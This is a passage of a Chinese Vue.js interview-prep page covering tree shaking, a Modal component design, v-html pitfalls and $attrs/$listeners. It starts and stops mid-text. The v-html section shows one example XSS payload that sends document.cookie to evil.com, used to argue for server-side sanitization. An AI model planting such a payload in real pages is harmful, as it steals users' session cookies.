question: function (newQuestion, oldQuestion) {\\n            this.answer = &#39;xxxx&#39;\\n        }\\n};\\n</code></pre>\\n<p>再一次打包，发现打包出来的体积并没有变化</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/6045e7bd46dc48f3.png\\" alt=\\"\\"></p>\\n<p><strong>Vue3 项目</strong></p>\\n<p>组件中简单使用</p>\\n<pre class=\\"language-js\\"><code>import { reactive, defineComponent } from &quot;vue&quot;;\\nexport default defineComponent({\\n  setup() {\\n    const state = reactive({\\n      count: 1,\\n    });\\n    return {\\n      state,\\n    };\\n  },\\n});\\n</code></pre>\\n<p>将项目进行打包</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/30de7985e2521249.png\\" alt=\\"\\"></p>\\n<p>在组件中引入<code>computed</code>和<code>watch</code></p>\\n<pre class=\\"language-js\\"><code>import { reactive, defineComponent, computed, watch } from &quot;vue&quot;;\\nexport default defineComponent({\\n  setup() {\\n    const state = reactive({\\n      count: 1,\\n    });\\n    const double = computed(() =&gt; {\\n      return state.count * 2;\\n    });\\n\\n    watch(\\n      () =&gt; state.count,\\n      (count, preCount) =&gt; {\\n        console.log(count);\\n        console.log(preCount);\\n      }\\n    );\\n    return {\\n      state,\\n      double,\\n    };\\n  },\\n});\\n</code></pre>\\n<p>再次对项目进行打包，可以看到在引入<code>computer</code>和<code>watch</code>之后，项目整体体积变大了</p>\\n<p><img src=\\"https://s.poetries.top/uploads/2022/09/0bf1724126701e32.png\\" alt=\\"\\"></p>\\n<p><strong>三、作用</strong></p>\\n<p>通过<code>Tree shaking</code>，<code>Vue3</code>给我们带来的好处是：</p>\\n<ul>\\n<li>减少程序体积（更小）</li>\\n<li>减少程序执行时间（更快）</li>\\n<li>便于将来对程序架构进行优化（更友好）</li>\\n</ul>\\n<h3 id=\\"用vue3-0-写过组件吗-如果想实现一个-modal你会怎么设计\\"><a class=\\"header-anchor\\" href=\\"#用vue3-0-写过组件吗-如果想实现一个-modal你会怎么设计\\">#</a> 用Vue3.0 写过组件吗？如果想实现一个 Modal你会怎么设计？</h3>\\n<p><strong>一、组件设计</strong></p>\\n<p>组件就是把图形、非图形的各种逻辑均抽象为一个统一的概念（组件）来实现开发的模式</p>\\n<p>现在有一个场景，点击新增与编辑都弹框出来进行填写，功能上大同小异，可能只是标题内容或者是显示的主体内容稍微不同</p>\\n<p>这时候就没必要写两个组件，只需要根据传入的参数不同，组件显示不同内容即可</p>\\n<p>这样，下次开发相同界面程序时就可以写更少的代码，意义着更高的开发效率，更少的 <code>Bug</code>和更少的程序体积</p>\\n<p><strong>二、需求分析</strong></p>\\n<p>实现一个<code>Modal</code>组件，首先确定需要完成的内容：</p>\\n<ul>\\n<li>遮罩层</li>\\n<li>标题内容</li>\\n<li>主体内容</li>\\n<li>确定和取消按钮</li>\\n</ul>\\n<p>主体内容需要灵活，所以可以是字符串，也可以是一段 <code>html</code> 代码</p>\\n<p>特点是它们在当前<code>vue</code>实例之外独立存在，通常挂载于<code>body</code>之上</p>\\n<p>除了通过引入<code>import</code>的形式，我们还可通过<code>API</code>的形式进行组件的调用</p>\\n<p>还可以包括配置全局样式、国际化、与<code>typeScript</code>结合</p>\\n<p><strong>三、实现流程</strong></p>\\n<p>首先看看大致流程：</p>\\n<ul>\\n<li>目录结构</li>\\n<li>组件内容</li>\\n<li>实现 <code>API</code> 形式</li>\\n<li>事件处理</li>\\n<li>其他完善</li>\\n</ul>\\n<p><strong>目录结构</strong></p>\\n<p><code>Modal</code>组件相关的目录结构</p>\\n<pre class=\\"language-text\\"><code>├── plugins\\n│   └── modal\\n│       ├── Content.tsx // 维护 Modal 的内容，用于 h 函数和 jsx 语法\\n│       ├── Modal.vue // 基础组件\\n│       ├── config.ts // 全局默认配置\\n│       ├── index.ts // 入口\\n│       ├── locale // 国际化相关\\n│       │   ├── index.ts\\n│       │   └── lang\\n│       │       ├── en-US.ts\\n│       │       ├── zh-CN.ts\\n│       │       └── zh-TW.ts\\n│       └── modal.type.ts // ts类型声明相关\\n</code></pre>\\n<p>因为 Modal 会被 <code>app.use(Modal)</code> 调用作为一个插件，所以都放在<code>plugins</code>目录下</p>\\n<p><strong>组件内容</strong></p>\\n<p>首先实现<code>modal.vue</code>的主体显示内容大致如下</p>\\n<pre class=\\"language-html\\"><code>&lt;Teleport to=&quot;body&quot; :disabled=&quot;!isTeleport&quot;&gt;\\n    &lt;div v-if=&quot;modelValue&quot; class=&quot;modal&quot;&gt;\\n        &lt;div\\n             class=&quot;mask&quot;\\n             :style=&quot;style&quot;\\n             @click=&quot;maskClose &amp;&amp; !loading &amp;&amp; handleCancel()&quot;\\n             &gt;&lt;/div&gt;\\n        &lt;div class=&quot;modal__main&quot;&gt;\\n            &lt;div class=&quot;modal__title line line--b&quot;&gt;\\n                &lt;span&gt;{{ title || t(&quot;r.title&quot;) }}&lt;/span&gt;\\n                &lt;span\\n                      v-if=&quot;close&quot;\\n                      :title=&quot;t(&#39;r.close&#39;)&quot;\\n                      class=&quot;close&quot;\\n                      @click=&quot;!loading &amp;&amp; handleCancel()&quot;\\n                      &gt;✕&lt;/span\\n                    &gt;\\n            &lt;/div&gt;\\n            &lt;div class=&quot;modal__content&quot;&gt;\\n                &lt;Content v-if=&quot;typeof content === &#39;function&#39;&quot; :render=&quot;content&quot; /&gt;\\n                &lt;slot v-else&gt;\\n                    {{ content }}\\n                &lt;/slot&gt;\\n            &lt;/div&gt;\\n            &lt;div class=&quot;modal__btns line line--t&quot;&gt;\\n                &lt;button :disabled=&quot;loading&quot; @click=&quot;handleConfirm&quot;&gt;\\n                    &lt;span class=&quot;loading&quot; v-if=&quot;loading&quot;&gt; ❍ &lt;/span&gt;{{ t(&quot;r.confirm&quot;) }}\\n                &lt;/button&gt;\\n                &lt;button @click=&quot;!loading &amp;&amp; handleCancel()&quot;&gt;\\n                    {{ t(&quot;r.cancel&quot;) }}\\n                &lt;/button&gt;\\n            &lt;/div&gt;\\n        &lt;/div&gt;\\n    &lt;/div&gt;\\n&lt;/Teleport&gt;\\n</code></pre>\\n<p>最外层上通过Vue3 <code>Teleport</code> 内置组件进行包裹，其相当于传送门，将里面的内容传送至<code>body</code>之上</p>\\n<p>并且从<code>DOM</code>结构上来看，把<code>modal</code>该有的内容（遮罩层、标题、内容、底部按钮）都实现了</p>\\n<p>关于主体内容</p>\\n<pre class=\\"language-html\\"><code>&lt;div class=&quot;modal__content&quot;&gt;\\n    &lt;Content v-if=&quot;typeof content===&#39;function&#39;&quot;\\n             :render=&quot;content&quot; /&gt;\\n    &lt;slot v-else&gt;\\n        {{content}}\\n    &lt;/slot&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p>可以看到根据传入<code>content</code>的类型不同，对应显示不同得到内容</p>\\n<p>最常见的则是通过调用字符串和默认插槽的形式</p>\\n<pre class=\\"language-js\\"><code>// 默认插槽\\n&lt;Modal v-model=&quot;show&quot;\\n       title=&quot;演示 slot&quot;&gt;\\n    &lt;div&gt;hello world~&lt;/div&gt;\\n&lt;/Modal&gt;\\n\\n// 字符串\\n&lt;Modal v-model=&quot;show&quot;\\n       title=&quot;演示 content&quot;\\n       content=&quot;hello world~&quot; /&gt;\\n</code></pre>\\n<p>通过 API 形式调用<code>Modal</code>组件的时候，<code>content</code>可以使用下面两种</p>\\n<ul>\\n<li><code>h 函数</code></li>\\n</ul>\\n<pre class=\\"language-js\\"><code>$modal.show({\\n  title: &#39;演示 h 函数&#39;,\\n  content(h) {\\n    return h(\\n      &#39;div&#39;,\\n      {\\n        style: &#39;color:red;&#39;,\\n        onClick: ($event: Event) =&gt; console.log(&#39;clicked&#39;, $event.target)\\n      },\\n      &#39;hello world ~&#39;\\n    );\\n  }\\n});\\n</code></pre>\\n<ul>\\n<li>JSX</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>$modal.show({\\n  title: &#39;演示 jsx 语法&#39;,\\n  content() {\\n    return (\\n      &lt;div\\n        onClick={($event: Event) =&gt; console.log(&#39;clicked&#39;, $event.target)}\\n      &gt;\\n        hello world ~\\n      &lt;/div&gt;\\n    );\\n  }\\n});\\n</code></pre>\\n<p><strong>实现 API 形式</strong></p>\\n<p>那么组件如何实现<code>API</code>形式调用<code>Modal</code>组件呢？</p>\\n<p>在<code>Vue2</code>中，我们可以借助<code>Vue</code>实例以及<code>Vue.extend</code>的方式获得组件实例，然后挂载到<code>body</code>上</p>\\n<pre class=\\"language-js\\"><code>import Modal from &#39;./Modal.vue&#39;;\\nconst ComponentClass = Vue.extend(Modal);\\nconst instance = new ComponentClass({ el: document.createElement(&quot;div&quot;) });\\ndocument.body.appendChild(instance.$el);\\n</code></pre>\\n<p>虽然<code>Vue3</code>移除了<code>Vue.extend</code>方法，但可以通过<code>createVNode</code>实现</p>\\n<pre class=\\"language-js\\"><code>import Modal from &#39;./Modal.vue&#39;;\\nconst container = document.createElement(&#39;div&#39;);\\nconst vnode = createVNode(Modal);\\nrender(vnode, container);\\nconst instance = vnode.component;\\ndocument.body.appendChild(container);\\n</code></pre>\\n<p>在<code>Vue2</code>中，可以通过<code>this</code>的形式调用全局 <code>API</code></p>\\n<pre class=\\"language-js\\"><code>export default {\\n    install(vue) {\\n       vue.prototype.$create = create\\n    }\\n}\\n</code></pre>\\n<p>而在 Vue3 的 <code>setup</code> 中已经没有 <code>this</code>概念了，需要调用<code>app.config.globalProperties</code>挂载到全局</p>\\n<pre class=\\"language-js\\"><code>export default {\\n    install(app) {\\n        app.config.globalProperties.$create = create\\n    }\\n}\\n</code></pre>\\n<p><strong>事件处理</strong></p>\\n<p>下面再看看看<code>Modal</code>组件内部是如何处理「确定」「取消」事件的，既然是<code>Vue3</code>，当然采用<code>Compositon API</code> 形式</p>\\n<pre class=\\"language-js\\"><code>// Modal.vue\\nsetup(props, ctx) {\\n  let instance = getCurrentInstance(); // 获得当前组件实例\\n  onBeforeMount(() =&gt; {\\n    instance._hub = {\\n      &#39;on-cancel&#39;: () =&gt; {},\\n      &#39;on-confirm&#39;: () =&gt; {}\\n    };\\n  });\\n\\n  const handleConfirm = () =&gt; {\\n    ctx.emit(&#39;on-confirm&#39;);\\n    instance._hub[&#39;on-confirm&#39;]();\\n  };\\n  const handleCancel = () =&gt; {\\n    ctx.emit(&#39;on-cancel&#39;);\\n    ctx.emit(&#39;update:modelValue&#39;, false);\\n    instance._hub[&#39;on-cancel&#39;]();\\n  };\\n\\n  return {\\n    handleConfirm,\\n    handleCancel\\n  };\\n}\\n</code></pre>\\n<p>在上面代码中，可以看得到除了使用传统<code>emit</code>的形式使父组件监听，还可通过<code>_hub</code>属性中添加 <code>on-cancel</code>，<code>on-confirm</code>方法实现在<code>API</code>中进行监听</p>\\n<pre class=\\"language-js\\"><code>app.config.globalProperties.$modal = {\\n   show({}) {\\n     /* 监听 确定、取消 事件 */\\n   }\\n}\\n</code></pre>\\n<p>下面再来目睹下<code>_hub</code>是如何实现</p>\\n<pre class=\\"language-js\\"><code>// index.ts\\napp.config.globalProperties.$modal = {\\n    show({\\n        /* 其他选项 */\\n        onConfirm,\\n        onCancel\\n    }) {\\n        /* ... */\\n\\n        const { props, _hub } = instance;\\n\\n        const _closeModal = () =&gt; {\\n            props.modelValue = false;\\n            container.parentNode!.removeChild(container);\\n        };\\n        // 往 _hub 新增事件的具体实现\\n        Object.assign(_hub, {\\n            async &#39;on-confirm&#39;() {\\n            if (onConfirm) {\\n                const fn = onConfirm();\\n                // 当方法返回为 Promise\\n                if (fn &amp;&amp; fn.then) {\\n                    try {\\n                        props.loading = true;\\n                        await fn;\\n                        props.loading = false;\\n                        _closeModal();\\n                    } catch (err) {\\n                        // 发生错误时，不关闭弹框\\n                        console.error(err);\\n                        props.loading = false;\\n                    }\\n                } else {\\n                    _closeModal();\\n                }\\n            } else {\\n                _closeModal();\\n            }\\n        },\\n            &#39;on-cancel&#39;() {\\n                onCancel &amp;&amp; onCancel();\\n                _closeModal();\\n            }\\n    });\\n}\\n};\\n</code></pre>\\n<p><strong>其他完善</strong></p>\\n<p>关于组件实现国际化、与<code>TypeScript</code>结合，大家可以根据自身情况在此基础上进行更改</p>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>新增页和编辑页都要弹表单，产品只要求标题和主体略有差异，开发却复制了两套 <code>Modal</code>，你会怎么收敛？</strong></p>\\n<p>我会保留一个基础 <code>Modal</code>，用 <code>title</code>、<code>content</code>、按钮配置和插槽表达差异，而不是按业务动作复制组件。字符串适合简单提示，默认插槽适合表单等复杂内容；过度配置会让组件变成业务规则容器，因此业务校验仍应留在调用方。</p>\\n</li>\\n<li>\\n<p><strong>后台页面既要支持 <code>&lt;Modal v-model=&quot;show&quot;&gt;</code>，又要支持 <code>$modal.show()</code> 命令式调用，你会怎样组织目录和入口？</strong></p>\\n<p>我会把展示层放在 <code>Modal.vue</code>，把渲染函数内容、默认配置、类型与国际化拆开，再由 <code>index.ts</code> 同时导出组件和插件。命令式入口使用 <code>createVNode</code> 与 <code>render</code> 创建独立实例，并将容器挂到 <code>body</code>；关闭时必须卸载并移除容器，避免残留节点。</p>\\n</li>\\n<li>\\n<p><strong>表格位于带 <code>overflow:hidden</code> 和层叠上下文的容器里，弹窗被裁切，设计师又要求某些嵌入场景不要挂到 <code>body</code>，你怎么处理？</strong></p>\\n<p>默认用 <code>Vue</code> 3 的 <code>Teleport</code> 把弹窗传送到 <code>body</code>，绕开父容器裁切和多数层叠上下文问题。再提供类似 <code>isTeleport</code> 的开关，让嵌入式场景保留原位置；关闭传送后，调用方要自行承担定位、遮罩范围和 <code>z-index</code> 冲突。</p>\\n</li>\\n<li>\\n<p><strong>线上用户连续点击“确定”后提交了两次，接口失败时弹窗还被关掉了，你会改哪段事件流程？</strong></p>\\n<p>确认动作开始后应进入 <code>loading</code>，禁用确认、取消、关闭图标及遮罩关闭，避免重复提交和中途退出。若 <code>onConfirm</code> 返回 <code>Promise</code>，只在成功后关闭，失败时恢复 <code>loading</code> 并保留弹窗；还要捕获异常，否则实例可能停在不可操作状态。</p>\\n</li>\\n<li>\\n<p><strong>团队有人想把命令式事件写进组件实例的私有 <code>_hub</code>，有人坚持只用公开接口，你会选哪种？</strong></p>\\n<p>声明式使用应坚持 <code>emit(\'on-confirm\')</code>、<code>emit(\'on-cancel\')</code> 和 <code>update:modelValue</code>，让父组件按标准协议监听。命令式 <code>API</code> 可在创建实例时注入回调或维护外部闭包；直接修改实例私有 <code>_hub</code> 虽能工作，但耦合内部结构，升级和类型维护成本更高。</p>\\n</li>\\n<li>\\n<p><strong>你把 <code>$modal</code> 挂到 <code>app.config.globalProperties</code> 后，<code>setup()</code> 里的同事说拿不到 <code>this</code>，插件接口怎么补齐？</strong></p>\\n<p><code>globalProperties</code> 主要兼容通过组件实例访问的写法，而 <code>setup()</code> 本身没有 <code>this</code>。我会同时导出显式的组合式调用入口，或用 <code>app.provide()</code> 配合 <code>inject()</code>；这会增加少量接口设计工作，但依赖来源、测试替换和 <code>TypeScript</code> 类型会更清楚。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_34-vue中v-html会导致哪些问题\\"><a class=\\"header-anchor\\" href=\\"#_34-vue中v-html会导致哪些问题\\">#</a> 34 Vue中v-html会导致哪些问题</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li>编译产物是 <code>domProps: { innerHTML }</code>，所以它的问题就是 <code>innerHTML</code> 的问题</li>\\n<li><strong>① <code>XSS</code></strong>：完全不转义，<code>&lt;img onerror&gt;</code> 这类内容会直接执行 —— 用户内容必须<strong>服务端白名单净化</strong>，前端 <code>DOMPurify</code> 只是兜底</li>\\n<li><strong>② 替换全部子元素</strong>：写在标签内部的插槽、子组件会被整体冲掉</li>\\n<li><strong>③ 不编译 <code>Vue</code> 语法</strong>：里面的插值、指令、组件都不生效，因为走的是原生 <code>innerHTML</code></li>\\n<li><strong>④ <code>scoped</code> 样式失效</strong>：插入的节点没有 <code>data-v-xxx</code> 属性，要用 <code>:deep()</code> 或非 scoped 样式</li>\\n<li>只需有限格式时，把内容解析成结构化数据再用组件渲染，比 <code>v-html</code> 安全得多</li>\\n</ul>\\n<p><strong><code>v-html</code> 本质上是给元素设置 <code>innerHTML</code>，最需要警惕的是未经净化的内容会带来 <code>XSS</code> 风险。</strong> 它还会整体替换原有子节点，而且插入内容不会经过 <code>Vue</code> 模板编译，所以其中的插值、指令和组件都不会生效。运行时生成的节点没有单文件组件的作用域属性，<code>scoped</code> 样式通常也选不中，可用 <code>:deep()</code> 或非作用域样式处理。用户富文本应先在服务端按白名单净化，前端过滤只能作为补充。</p>\\n</section>\\n<p><code>v-html</code> 的编译产物是 <code>domProps: { innerHTML: ... }</code>，所以它的问题就是 <code>innerHTML</code> 的问题：</p>\\n<p><strong>① <code>XSS</code> 攻击 —— 最严重的一个</strong></p>\\n<p><code>v-html</code> <strong>不做任何转义</strong>，内容里的 <code>&lt;script&gt;</code>、<code>onerror</code> 事件属性都会被执行：</p>\\n<pre class=\\"language-html\\"><code>&lt;!-- 用户提交的&quot;内容&quot; --&gt;\\n&lt;img src=x onerror=&quot;fetch(&#39;//evil.com?c=&#39;+document.cookie)&quot;&gt;\\n</code></pre>\\n<p>只要这段字符串进了 <code>v-html</code>，用户的 <code>cookie</code> 就被送走了。所以规矩是：<strong><code>v-html</code> 的内容必须来自可信来源</strong>，用户提交的富文本必须在服务端用白名单净化后才能入库，前端再用 <code>DOMPurify</code> 兜一层。</p>\\n<p>注意&quot;前端过滤&quot;不能替代服务端 —— 攻击者可以直接调接口绕过前端。</p>\\n<p><strong>② 会替换掉标签内部的所有子元素</strong></p>\\n<p><code>v-html</code> 是整体替换 <code>innerHTML</code>，写在它上面的插槽内容、子组件、其他子元素全部被冲掉：</p>\\n<pre class=\\"language-html\\"><code>&lt;div v-html=&quot;content&quot;&gt;\\n  &lt;span&gt;这段永远不会显示&lt;/span&gt;   &lt;!-- 被 content 覆盖 --&gt;\\n&lt;/div&gt;\\n</code></pre>\\n<p><strong>③ 插入的内容不是响应式的，也不会编译 <code>Vue</code> 语法</strong></p>\\n<pre class=\\"language-html\\"><code>&lt;div v-html=&quot;&#39;&lt;span&gt;{{ msg }}&lt;/span&gt;&#39;&quot;&gt;&lt;/div&gt;   &lt;!-- 原样显示 {{ msg }}，不会被解析 --&gt;\\n</code></pre>\\n<p>因为它走的是浏览器原生的 <code>innerHTML</code>，不经过 <code>Vue</code> 的模板编译。所以里面的指令、插值、组件都不生效。真要渲染动态模板得用运行时编译版本的 <code>Vue</code>（体积大三成，且本身也是安全隐患）。</p>\\n<p><strong>④ 单文件组件的 <code>scoped</code> 样式对它无效</strong></p>\\n<p><code>scoped</code> 靠给元素加 <code>data-v-xxx</code> 属性实现，而 <code>v-html</code> 插入的节点是运行时才产生的，没有这个属性，所以样式选不中。解决办法是用深度选择器（<code>:deep()</code>），或者把这部分样式写在非 <code>scoped</code> 的 <code>style</code> 块里。</p>\\n<p><strong>⑤ 服务端渲染时同样有风险</strong>，而且注入的内容会直接进入 <code>HTML</code> 响应，影响面更大。</p>\\n<p><strong>替代方案</strong>：如果只需要有限的格式（加粗、链接、换行），更安全的做法是把内容解析成结构化数据，再用组件渲染 —— 这样完全不需要 <code>v-html</code>。</p>\\n<p>下面是编译产物的细节：</p>\\n<ul>\\n<li>可能会导致 <code>xss</code> 攻击</li>\\n<li><code>v-html</code> 会替换掉标签内部的子元素</li>\\n</ul>\\n<pre class=\\"language-js\\"><code>let template = require(&#39;vue-template-compiler&#39;); \\nlet r = template.compile(`&lt;div v-html=&quot;&#39;&lt;span&gt;hello&lt;/span&gt;&#39;&quot;&gt;&lt;/div&gt;`) \\n\\n// with(this){return _c(&#39;div&#39;,{domProps: {&quot;innerHTML&quot;:_s(&#39;&lt;span&gt;hello&lt;/span&gt;&#39;)}})} \\nconsole.log(r.render);\\n\\n// _c 定义在core/instance/render.js \\n// _s 定义在core/instance/render-helpers/index,js\\nif (key === &#39;textContent&#39; || key === &#39;innerHTML&#39;) { \\n    if (vnode.children) vnode.children.length = 0 \\n    if (cur === oldProps[key]) continue // #6601 work around Chrome version &lt;= 55 bug where single textNode // replaced by innerHTML/textContent retains its parentNode property \\n    if (elm.childNodes.length === 1) { \\n        elm.removeChild(elm.childNodes[0]) \\n    } \\n}\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>资讯详情页把用户提交的富文本直接交给 <code>v-html</code>，同事说浏览器不会执行 <code>innerHTML</code> 里的 <code>&lt;script&gt;</code>，所以足够安全，你怎么反驳？</strong></p>\\n<p>不能据此判定安全，因为攻击载荷还可放在 <code>onerror</code> 等事件属性中，<code>v-html</code> 又不会转义内容。用户富文本应在服务端按白名单净化后再入库，前端用 <code>DOMPurify</code> 兜底；只做前端过滤会被直接调用接口绕过。</p>\\n</li>\\n<li>\\n<p><strong>运营后台只允许加粗、链接和换行，却准备开放任意 <code>HTML</code> 来省开发时间，你会怎样落地？</strong></p>\\n<p>我会优先把有限格式解析为结构化数据，再通过受控组件渲染，从源头避免任意 <code>innerHTML</code>。若业务确实必须接收富文本，则服务端和前端都采用成熟白名单净化，并限制标签、属性和链接协议；自写正则黑名单很难覆盖变形载荷。</p>\\n</li>\\n<li>\\n<p><strong>文章模板里写了 <code>&lt;div v-html=&quot;content&quot;&gt;&lt;Loading /&gt;&lt;/div&gt;</code>，加载时还能看到组件，数据返回后组件突然消失，原因是什么？</strong></p>\\n<p><code>v-html</code> 最终设置的是元素的 <code>innerHTML</code>，更新时会整体替换该元素原有的子节点，因此 <code>&lt;Loading /&gt;</code> 会被清掉。加载态应放到 <code>v-html</code> 容器外，或用条件分支让两者互斥；不能指望插槽、子组件和注入 <code>HTML</code> 共存。</p>\\n</li>\\n<li>\\n<p><strong><code>CMS</code> 内容中写了 <code>{&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;{ user.name }&lt;span class=&quot;vp-brace-split&quot; aria-hidden=&quot;true&quot;&gt;&lt;/span&gt;}</code>、<code>@click</code> 和一个业务组件标签，发布后全都不工作，你会先查哪里？</strong></p>\\n<p>这不是响应式失效，而是 <code>v-html</code> 插入的字符串没有经过 <code>Vue</code> 模板编译，插值、指令和组件标签都会按普通文本或原生节点处理。交互内容应转成数据后由真实组件渲染；启用运行时模板编译会增加体积和安全风险，不能直接编译不可信输入。</p>\\n</li>\\n<li>\\n<p><strong>详情页的富文本能显示，但 <code>.article[data-v-xxx] p</code> 一直选不中段落，去掉 <code>scoped</code> 后又污染全站样式，你怎么修？</strong></p>\\n<p>运行时由 <code>v-html</code> 创建的节点没有单文件组件生成的 <code>data-v-xxx</code> 属性，因此普通 <code>scoped</code> 选择器无法命中。可在外层保留作用域类，再用 <code>:deep()</code> 限定富文本内部样式；若改为非 <code>scoped</code> 样式，必须增加稳定命名空间以控制污染范围。</p>\\n</li>\\n<li>\\n<p><strong>服务端渲染的新闻页已经在前端调用 <code>DOMPurify</code>，安全同学仍阻止上线，争议点在哪里？</strong></p>\\n<p>前端净化发生在页面到达浏览器之后，不能保护服务端已写入 <code>HTML</code> 响应的那段内容，<code>SSR</code> 下影响面反而更大。净化必须进入服务端渲染或入库链路，前端只作纵深防御；同时要确保服务端与客户端规则一致，避免内容差异引发渲染异常。</p>\\n</li>\\n</ul>\\n</section>\\n<h2 id=\\"_35-说下-attrs和-listeners的使用场景\\"><a class=\\"header-anchor\\" href=\\"#_35-说下-attrs和-listeners的使用场景\\">#</a> 35 说下$attrs和$listeners的使用场景</h2>\\n<section class=\\"custom-block recall\\"><p class=\\"custom-block-title recall-title\\">⚡ 30 秒速记</p>\\n<ul>\\n<li><code>$attrs</code> 收集<strong>父组件传下来但当前组件没在 <code>props</code> 里声明</strong>的属性</li>\\n<li><code>$listeners</code>（<code>Vue 2</code>）收集所有事件监听器；<code>Vue 3</code> 把它<strong>合并进了 <code>$attrs</code></strong></li>\\n<li>主要场景：<strong>二次封装第三方组件</strong>，把使用方传的属性和事件原样透传给内部组件</li>\\n<li>默认会自动落到根元素上，加 <code>inheritAttrs: false</code> 关掉自动继承，再手动 <code>v-bind=&quot;$attrs&quot;</code> 指定落点</li>\\n<li>⚠️ 多根节点组件（<code>Vue 3</code> 的 <code>Fragment</code>）不会自动透传，必须手动绑定，否则样式和事件会莫名丢失</li>\\n</ul>\\n<p><strong><code>$attrs</code> 用来接收未在 <code>props</code> 中声明的透传属性，<code>$listeners</code> 在 <code>Vue 2</code> 中负责接收事件监听器。</strong> 它们常用于二次封装组件，通过 <code>v-bind=&quot;$attrs&quot;</code>、<code>v-on=&quot;$listeners&quot;</code> 把调用方的配置继续传给内部组件。<code>Vue 3</code> 已移除 <code>$listeners</code>，事件也合并进 <code>$attrs</code>。如果关闭自动继承或组件存在多个根节点，就要手动指定这些属性的落点。</p>\\n</section>\\n<p>API考察，但<code>$attrs</code>和<code>$listeners</code>是比较少用的边界知识，而且<code>vue3</code>有变化，<code>$listeners</code>已经移除，还是有细节可说的</p>\\n<p><strong>体验</strong></p>\\n<p>一个包含组件透传属性的对象</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n    &lt;child-component v-bind=&quot;$attrs&quot;&gt;\\n        将非属性特性透传给内部的子组件\\n    &lt;/child-component&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<p><strong>回答范例</strong></p>\\n<ul>\\n<li>我们可能会有一些属性和事件没有在<code>props</code>中定义，这类称为非属性特性，结合<code>v-bind</code>指令可以直接透传给内部的子组件。</li>\\n<li>这类“属性透传”常常用于包装高阶组件时往内部传递属性，常用于爷孙组件之间传参。比如我在扩展A组件时创建了组件B组件，然后在C组件中使用B，此时传递给C的属性中只有<code>props</code>里面声明的属性是给B使用的，其他的都是A需要的，此时就可以利用<code>v-bind=&quot;$attrs&quot;</code>透传下去。</li>\\n<li>最常见用法是结合<code>v-bind</code>做展开；<code>$attrs</code>本身不是响应式的，除非访问的属性本身是响应式对象。</li>\\n<li><code>vue2</code>中使用<code>listeners</code>获取事件，<code>vue3</code>中已移除，均合并到<code>attrs</code>中,使用起来更简单了</li>\\n</ul>\\n<p><strong>原理</strong></p>\\n<p>查看透传属性<code>foo</code>和普通属性<code>bar</code>，发现<code>vnode</code>结构完全相同，这说明<code>vue3</code>中将分辨两者工作由框架完成而非用户指定：</p>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;h1&gt;{{ msg }}&lt;/h1&gt;\\n  &lt;comp foo=&quot;foo&quot; bar=&quot;bar&quot; /&gt;\\n&lt;/template&gt;\\n</code></pre>\\n<pre class=\\"language-html\\"><code>&lt;template&gt;\\n  &lt;div&gt;\\n    {{$attrs.foo}} {{bar}}\\n  &lt;/div&gt;\\n&lt;/template&gt;\\n\\n&lt;script setup&gt;\\ndefineProps({\\n  bar: String\\n})\\n&lt;/script&gt;\\n</code></pre>\\n<pre class=\\"language-text\\"><code>_createVNode(Comp, {\\n    foo: &quot;foo&quot;,\\n    bar: &quot;bar&quot;\\n})\\n</code></pre>\\n<section class=\\"custom-block followup\\"><p class=\\"custom-block-title followup-title\\">💬 面试官追问</p>\\n<ul>\\n<li>\\n<p><strong>业务封装的 <code>SearchInput</code> 外面有一层 <code>div</code>，调用方传入 <code>maxlength</code> 和 <code>placeholder</code> 后都落错位置，你会怎么改？</strong></p>\\n<p>我会关闭不合适的自动继承，并在内部真实输入组件上显式写 <code>v-bind=&quot;$attrs&quot;</code>，把未声明为 <code>props</code> 的特性透传到正确落点。组件自身需要消费的参数仍应声明为 <code>props</code>；无差别透传可能把 <code>class</code>、事件或无效属性带到错误节点。</p>\\n</li>\\n<li>\\n<p><strong>你要封装第三方组件 <code>A</code> 为业务组件 <code>B</code>，再由页面组件 <code>C</code> 使用，<code>A</code> 新增几十个可选属性时，是否要在 <code>B</code> 里逐个声明？</strong></p>\\n<p>若 <code>B</code> 不需要解释或校验这些属性，可通过 <code>v-bind=&quot;$attrs&quot;</code> 把 <code>C</code> 传入但未被 <code>B</code> 声明的特性继续交给 <code>A</code>，无须机械复制几十个 <code>props</code>。<code>B</code> 真正参与业务逻辑的参数仍要显式声明，否则接口边界和类型信息会变得含糊。</p>\\n</li>\\n<li>\\n<p><strong><code>Vue</code> 2 包装组件依赖 <code>v-on=&quot;$listeners&quot;</code>，迁到 <code>Vue</code> 3 后构建报 <code>$listeners</code> 不存在，事件该怎么继续透传？</strong></p>\\n<p><code>Vue</code> 3 已移除 <code>$listeners</code>，组件监听器被合并进 <code>$attrs</code>，因此通常由 <code>v-bind=&quot;$attrs&quot;</code> 一并透传属性和事件。迁移时还要检查目标节点，因为错误落点会让点击等监听器表面上“消失”；需要改写语义的事件则应显式声明并重新触发。</p>\\n</li>\\n<li>\\n<p><strong>一个 <code>Vue</code> 3 组件改成标题和内容两个根节点后，线上发现父级传入的 <code>class</code> 与点击事件不再生效，你怎么定位？</strong></p>\\n<p>多根节点时框架无法判断透传特性应落到哪个根节点，自动继承会失去明确目标。应根据语义在指定元素或内部组件上显式 <code>v-bind=&quot;$attrs&quot;</code>，必要时拆分属性；不能把同一批事件盲目绑定到两个根节点，否则可能重复触发。</p>\\n</li>\\n<li>\\n<p><strong>同事在 <code>setup()</code> 里解构 <code>$attrs</code> 后期望新增属性自动驱动一段副作用，但结果没有更新，你会怎样处理？</strong></p>\\n<p><code>$attrs</code> 本身不适合作为常规响应式状态来源，直接解构还会丢失统一访问入口。模板透传可直接使用 <code>$attrs</code>；若逻辑确实依赖属性变化，应把该字段声明成 